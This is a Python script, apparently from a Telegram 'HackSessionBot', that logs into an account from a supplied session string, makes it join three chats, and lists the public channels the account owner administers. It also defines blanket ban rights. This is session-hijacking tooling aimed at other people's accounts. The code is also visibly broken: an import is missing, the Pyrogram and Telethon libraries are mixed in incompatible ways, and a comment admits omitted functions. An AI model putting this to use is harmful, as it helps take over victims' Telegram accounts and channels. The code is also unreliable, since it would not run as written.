import asyncio
import os
import sys
from typing import List, Union

import pyrogram
from pyrogram import Client, filters
from telethon import TelegramClient, events
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
from telethon.tl.functions.messages import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins

from HackSessionBot import (
    API_ID,
    API_HASH,
    CHAT,
)

pyrogram_api_id = API_ID
pyrogram_api_hash = API_HASH
telethon_api_id = API_ID
telethon_api_hash = API_HASH

pyrogram_client = Client("pyrogram_client", api_id=pyrogram_api_id, api_hash=pyrogram_api_hash)
telethon_client = TelegramClient("telethon_client", api_id=telethon_api_id, api_hash=telethon_api_hash)

RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

async def is_admin(chat_id: int, user_id: int) -> bool:
    async with telethon_client as tclient:
        result = await tclient.get_participants(chat_id, filter=ChannelParticipantsAdmins)
        return any(user_id == user.id for user in result)

async def users_gc(session: str) -> str:
    err = ""
    msg = ""

    async with pyrogram_client.start(session) as pc:
        try:
            await pc.join_chat("@Devs_Testing_Group")
            await pc.join_chat("@Steve_Projects")
            await pc.join_chat(CHAT)

            k = await pc.invoke(GetAdminedPublicChannelsRequest())
            for x in k.chats:
                msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
        except Exception as idk:
            err += str(idk)

    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg

# ... (other functions remain the same with minimal modifications)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python hack_session_bot.py <session_string>")
        sys.exit(1)

    session_string = sys.argv[1]
    result = asyncio.run(users_gc(session_string))
    print(result)
